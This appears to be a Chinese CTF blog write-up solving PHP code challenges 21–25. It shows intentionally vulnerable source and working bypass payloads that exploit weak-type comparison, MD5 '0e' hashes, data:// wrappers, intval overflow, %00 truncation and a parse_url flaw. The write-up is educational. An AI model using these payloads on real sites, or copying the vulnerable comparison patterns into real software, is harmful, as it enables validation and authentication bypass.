<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump([<span class="number">1</span>=&gt;<span class="number">0</span>]==[<span class="number">1</span>=&gt;<span class="number">0</span>]);</span><br><span class="line">var_dump([<span class="number">1</span>=&gt;<span class="number">0</span>]===[<span class="number">1</span>=&gt;<span class="number">0</span>]);</span><br><span class="line">var_dump([<span class="number">1</span>=&gt;<span class="number">0</span>]==[<span class="number">2</span>=&gt;<span class="number">0</span>]);</span><br><span class="line">var_dump([<span class="number">1</span>=&gt;<span class="number">0</span>]===[<span class="number">2</span>=&gt;<span class="number">0</span>]);</span><br><span class="line">var_dump([<span class="number">0</span> =&gt; <span class="number">0</span>] === [<span class="number">0x100000000</span> =&gt; <span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589069580133.png" alt="1589069580133"></p>
<p>当PHP版本为5.6及以下时，<code>var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]);</code>返回了true<br>即可以通过这个漏洞绕过<br>payload</p>
<blockquote>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="literal">user</span>[<span class="number">4294967296</span>]=<span class="literal">admin</span>&amp;<span class="literal">user</span>[<span class="number">1</span>]=xxoo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<p>2^32 == 0x100000000 == 4294967296 由于是截断漏洞，所以 0x100000000 后面再多几个 0 也是可以的，适当转换成对应的 10 进制数</p>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589070166987.png" alt="1589070166987"></p>
<h1 id="challenge21"><a href="#challenge21" class="headerlink" title="challenge21"></a>challenge21</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password))	<span class="comment">#可见字符超过12个</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Wrong Format'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">TRUE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line">        		<span class="comment">#标点符号，数字，大小写字母</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        $c = <span class="number">0</span>;</span><br><span class="line">        $ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>);</span><br><span class="line">        <span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))</span><br><span class="line">            $c += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">POSIX</th>
<th align="left">Description</th>
<th>ASCII</th>
<th>Unicode</th>
<th>Shorthand</th>
<th align="right">Java</th>
</tr>
</thead>
<tbody><tr>
<td align="left">[:alnum:]</td>
<td align="left">Alphanumeric characters</td>
<td>[a-zA-Z0-9]</td>
<td>[\p{L&amp;}\p{Nd}]</td>
<td></td>
<td align="right">\p{Alnum}</td>
</tr>
<tr>
<td align="left">[:alpha:]</td>
<td align="left">Alphabetic characters</td>
<td>[a-zA-Z]</td>
<td>\p{L&amp;}</td>
<td></td>
<td align="right">\p{Alpha}</td>
</tr>
<tr>
<td align="left">[:ascii:]</td>
<td align="left">ASCII characters</td>
<td>[\x00-\x7F]</td>
<td>\p{InBasicLatin}</td>
<td></td>
<td align="right">\p{ASCII}</td>
</tr>
<tr>
<td align="left">[:blank:]</td>
<td align="left">Space and tab</td>
<td>[ \t]</td>
<td>[\p{Zs}\t]</td>
<td>\h</td>
<td align="right">\p{Blank}</td>
</tr>
<tr>
<td align="left">[:cntrl:]</td>
<td align="left">Control characters</td>
<td>[\x00-\x1F\x7F]</td>
<td>\p{Cc}</td>
<td></td>
<td align="right">\p{Cntrl}</td>
</tr>
<tr>
<td align="left">[:digit:]</td>
<td align="left">Digits</td>
<td>[0-9]</td>
<td>\p{Nd}</td>
<td>\d</td>
<td align="right">\p{Digit}</td>
</tr>
<tr>
<td align="left">[:graph:]</td>
<td align="left">可见字符（即空格，控制字符等除外）</td>
<td>[\x21-\x7E]</td>
<td>[^\p{Z}\p{C}]</td>
<td></td>
<td align="right">\p{Graph}</td>
</tr>
<tr>
<td align="left">[:lower:]</td>
<td align="left">Lowercase letters</td>
<td>[a-z]</td>
<td>\p{Ll}</td>
<td></td>
<td align="right">\p{Lower}</td>
</tr>
<tr>
<td align="left">[:print:]</td>
<td align="left">Visible characters and spaces (i.e. anything except control characters, etc.)</td>
<td>[\x20-\x7E]</td>
<td>\P{C}</td>
<td></td>
<td align="right">\p{Print}</td>
</tr>
<tr>
<td align="left">[:punct:]</td>
<td align="left">标点和符号</td>
<td>[!”#$%&amp;’()*+,  -./:;&lt;=&gt;?@  [\]^_`{|}~]</td>
<td>[\p{P}\p{S}]</td>
<td></td>
<td align="right">\p{Punct}</td>
</tr>
<tr>
<td align="left">[:space:]</td>
<td align="left">All whitespace characters, including line breaks</td>
<td>[ \t\r\n\v\f]</td>
<td>[\p{Z}\t\r\n\v\f]</td>
<td>\s</td>
<td align="right">\p{Space}</td>
</tr>
<tr>
<td align="left">[:upper:]</td>
<td align="left">Uppercase letters</td>
<td>[A-Z]</td>
<td>\p{Lu}</td>
<td></td>
<td align="right">\p{Upper}</td>
</tr>
<tr>
<td align="left">[:word:]</td>
<td align="left">Word characters (letters, numbers and underscores)</td>
<td>[A-Za-z0-9_]</td>
<td>[\p{L}\p{N}\p{Pc}]</td>
<td>\w</td>
<td align="right"></td>
</tr>
<tr>
<td align="left">[:xdigit:]</td>
<td align="left">Hexadecimal digits</td>
<td>[A-Fa-f0-9]</td>
<td>[A-Fa-f0-9]</td>
<td></td>
<td align="right">\p{XDigit}</td>
</tr>
</tbody></table>
<blockquote>
<p>preg_match_all 函数用于执行一个全局正则表达式匹配。</p>
<p><strong>语法</strong></p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int preg_match_all ( string $pattern , string $subject [,<span class="built_in"> array </span>&amp;$matches [,<span class="built_in"> int </span>$flags = PREG_PATTERN_ORDER [,<span class="built_in"> int </span>$offset = 0 ]]] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>搜索 subject 中所有匹配 pattern 给定正则表达式的匹配结果并且将它们以 flag 指定顺序输出到 matches 中。 </p>
<p>在第一个匹配找到后, 子序列继续从最后一次匹配位置搜索。</p>
<p>参数说明：</p>
<ul>
<li>$pattern: 要搜索的模式，字符串形式。</li>
<li>$subject: 输入字符串。</li>
<li>$matches: 多维数组，作为输出参数输出所有匹配结果, 数组排序通过flags指定。</li>
<li>$flags：可以结合下面标记使用(注意不能同时使用PREG_PATTERN_ORDER和 PREG_SET_ORDER)：</li>
</ul>
<ol>
<li>PREG_PATTERN_ORDER:  结果排序为$matches[0]保存完整模式的所有匹配, $matches[1] 保存第一个子组的所有匹配，以此类推。</li>
<li>PREG_SET_ORDER:  结果排序为$matches[0]包含第一次匹配得到的所有匹配(包含子组)， $matches[1]是包含第二次匹配到的所有匹配(包含子组)的数组，以此类推。</li>
<li>PREG_OFFSET_CAPTURE:  如果这个标记被传递，每个发现的匹配返回时会增加它相对目标字符串的偏移量。</li>
</ol>
<ul>
<li>offset: 通常， 查找时从目标字符串的开始位置开始。可选参数offset用于 从目标字符串中指定位置开始搜索(单位是字节)。</li>
</ul>
<p><strong>if (6 &gt; preg_match_all($reg, $password, $arr))表示把连续的大写，小写，数字，符号作为一段，至少分六段</strong></p>
</blockquote>
<ol>
<li>可见字符超过12</li>
<li>字符串中，把连续的大写，小写，数字，符号作为一段，至少分六段，例如a12SD+io8可以分成a 12 SD + io 8六段</li>
<li>大写，小写，数字，符号这四种类型至少要出现三种，如下：</li>
</ol>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589193100660.png" alt="1589193100660"></p>
<p>接着就是满足<code>if (&quot;42&quot; == $password)</code>,使用十六进制为<code>0x2A</code>，这里已经满足3，满足1只需要再前面添加0即可，但是正则2却没办法满足，在16进制前后加符号和小数点都会破坏在判断相等时进行的转换<br>接下来想到科学计数法<br>42=4.2e1=420e-1=420.000000e-1<br>payload:</p>
<blockquote>
<p>password=420.000000e-1</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589193740643.png" alt="1589193740643"></p>
<h1 id="challenge22"><a href="#challenge22" class="headerlink" title="challenge22"></a>challenge22</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'flag.php'</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>) <span class="keyword">and</span> <span class="keyword">die</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Wonderbubulous! Flag is "</span>.$flag;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Nah... '"</span>,htmlspecialchars($md5),<span class="string">"' not the same as "</span>,md5($md5);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>MD5弱类型比较<br>双MD5碰撞脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python2</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MD5</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(data).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    a = <span class="number">100000000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = <span class="string">'0e'</span> + str(a)</span><br><span class="line">        data_md5 = MD5(data)</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>,data_md5)):</span><br><span class="line">            print(data)</span><br><span class="line">            print(data_md5)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(a % <span class="number">1000000</span> == <span class="number">0</span>):</span><br><span class="line">            print(a)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>结果<code>0e215962017</code></p>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589194023888.png" alt="1589194023888"></p>
<h1 id="challenge23"><a href="#challenge23" class="headerlink" title="challenge23"></a>challenge23</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    @$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">    @$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(@file_get_contents($k1)===<span class="string">"Hello hacker!"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'welcome! Hacker!&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">if</span>(md5($k2)&gt;<span class="number">666666</span>*<span class="number">666666</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>); </span><br><span class="line">            @$k3=$_GET[<span class="string">'key3'</span>];</span><br><span class="line">            @$k4=$_GET[<span class="string">'key4'</span>];</span><br><span class="line">            <span class="keyword">if</span>(intval($k3)&lt;<span class="number">666</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>($k3==<span class="number">666</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Come on, flag is coming&lt;br&gt;'</span>;</span><br><span class="line">                    <span class="keyword">if</span>($k4&gt;<span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(intval($k3+$k4)&lt;<span class="number">666</span>)</span><br><span class="line">                            <span class="keyword">echo</span> $flag;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先使用<code>file_get_contents</code>获取到$k1的文本的内容要等于<code>Hello hacker!</code>,这个以前遇到了很多次，基本就是使用data://为协议来传参</p>
<blockquote>
<p>?key1=data://text/plain;base64,SGVsbG8gaGFja2VyIQ==</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589200437110.png" alt="1589200437110"></p>
<p>$k2要求是key2的md5的值要大于<code>666666*666666</code>所以直接 找一个MD5全是数字的字符串即可，<code>1518375</code>满足条件。<br><img src="/2020/05/12/PHP_Code_Challenge/1589204540462.png" alt="1589204540462"></p>
<p>字符串<code>skwerl11</code>也可以， 它的md5值是<code>1e21ff98693770b768e4a1a4a704811b</code>, <code>1e</code>是科学计数法</p>
<p>key3需要key3的值转换成int之后小于666, 同时需要原始的值等于666， 可以使用精度绕过<code>665.9999999999999999999</code>，还可以使用十六进制绕过<code>0x29a</code></p>
<p>最后一个是key4, 由于intval的表达范围是有限制的，取决于操作系统，所以用了溢出</p>
<p>payload:</p>
<blockquote>
<p>?key1=data://text/plain;base64,SGVsbG8gaGFja2VyIQ==&amp;key2=skwerl11&amp;key3=0x29a&amp;key4=999999999999999999999999999999999999999999999999999999</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589205337746.png" alt="1589205337746"></p>
<h1 id="challenge24"><a href="#challenge24" class="headerlink" title="challenge24"></a>challenge24</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</span><br><span class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array($a))&#123;</span><br><span class="line">   is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">   <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</span><br><span class="line">       ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</span><br><span class="line">       $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</span><br><span class="line">       $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">       <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">           $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       $v2=<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c=@$_GET[<span class="string">'cat'</span>];</span><br><span class="line">$d=@$_GET[<span class="string">'dog'</span>];</span><br><span class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</span><br><span class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</span><br><span class="line">       eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">       strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>1.</strong>传入的<code>foo</code>，经过一次<code>json_decode</code>，然后转换成<code>array</code>。然后判断 <code>$a[&quot;bar1&quot;]</code>是否满足 <code>is_numeric</code>，若满足则die掉。接下来又判断 <code>$a[&quot;bar1&quot;]</code>是否大于 2016 。</p>
<p>利用php弱类型特性，可以设置</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">a</span>[<span class="string">"bar1"</span>] = <span class="number">2017</span><span class="keyword">a</span></span><br></pre></td></tr></table></figure>

<p>这样<code>is_numeric</code>时会判断其为字符串而不是数字，而在与2016的比较中，会直接转换成2017，满足大于2016。这样 v1 就被设置为 1 了</p>
<p><strong><em>2.</em></strong>接下来，要求<code>$a[&quot;bar2&quot;]</code>是个数组，其中元素的个数为5个<code>（count($a[&quot;bar2&quot;])!==5）</code>，同时要求<code>$a[&quot;bar2&quot;][0]</code>是数组。所以我们设置:</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a[<span class="string">"bar2"</span>] = [[],<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br></pre></td></tr></table></figure>

<p>对于 <code>$pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);</code>，它搜索字符串<code>“nudt”</code>在<code>$a[&quot;a2&quot;]</code>中的位置。若没有找到，<code>array_search</code>返回<code>false</code>，会通过严格比较导致die掉。所以这里要设置：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$a</span>[<span class="string">"a2"</span>] = “nudt”</span><br></pre></td></tr></table></figure>

<p>注意这里因为用了<code>$pos===false?</code>的严格比较，所以0不<code>===false</code>。</p>
<p>之后就能设置 <code>v2 = 1</code></p>
<p><strong>3.</strong>先会用<code>strcmp</code>进行比较，利用数组array和字符串进行strcmp比较会返回null，而且数组array也不会等于字符串，我们可以设置<code>cat[1]</code>为一个数组。</p>
<p>接下来用<code>eregi</code>对拼接后的字符串<code>$d.$c[0]</code>进行正则匹配，若匹配到则die掉。而下一步又要求拼接字符串<code>$c[0]</code>.<code>$d</code>中要有字符串<code>“htctf2016”</code>。这里利用<code>%00</code>对<code>eregi</code>的截断功能，则在正则匹配<code>eregi</code>时在开头时就匹配结束掉。</p>
<p><code>strpos(($c[0].$d), &quot;htctf2016&quot;)</code>中，还要求<code>“htctf2016”</code>不能出现在开头。</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$d = %00 即 dog=%00</span><br><span class="line"></span><br><span class="line">$c[<span class="number">0</span>]  = <span class="string">"ahtctf2016"</span></span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<blockquote>
<p>?foo={“bar1”:”2017e”,”bar2”:[[],2,3,4,5],”a2”:[“nudt”]}&amp;cat[0]=ahtctf2016&amp;cat[1][]=&amp;dog=%00</p>
</blockquote>
<p><img src="/2020/05/12/PHP_Code_Challenge/1589264462522.png" alt="1589264462522"></p>
<h1 id="challenge25"><a href="#challenge25" class="headerlink" title="challenge25"></a>challenge25</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/flag.php"</span>;</span><br><span class="line"></span><br><span class="line">    $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">    $params = explode(<span class="string">"&amp;"</span>, $url_query);  <span class="comment">#把字符串打散为数组</span></span><br><span class="line">    <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">        $idx_equal = strpos($param, <span class="string">"="</span>);</span><br><span class="line">        <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">            $key = $param;</span><br><span class="line">            $value = <span class="string">""</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $key = substr($param, <span class="number">0</span>, $idx_equal);</span><br><span class="line">            $value = substr($param, $idx_equal + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>这里有一个正则：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>但是题目却要求我们使用<code>do_you_want_flag=yes</code>来获取flag显然相互矛盾，我们寻找漏洞点，发现url的解析工作有由<code>parse_url()</code>操作此时相当<code>parse_url</code>一个解析漏洞，详情参考这篇文章:</p>
<p><a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/</a></p>
<p>4.所以我最后的bypass payload为:</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///?do_you_want_flag=yes</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589265667662.png" alt="1589265667662"></p>
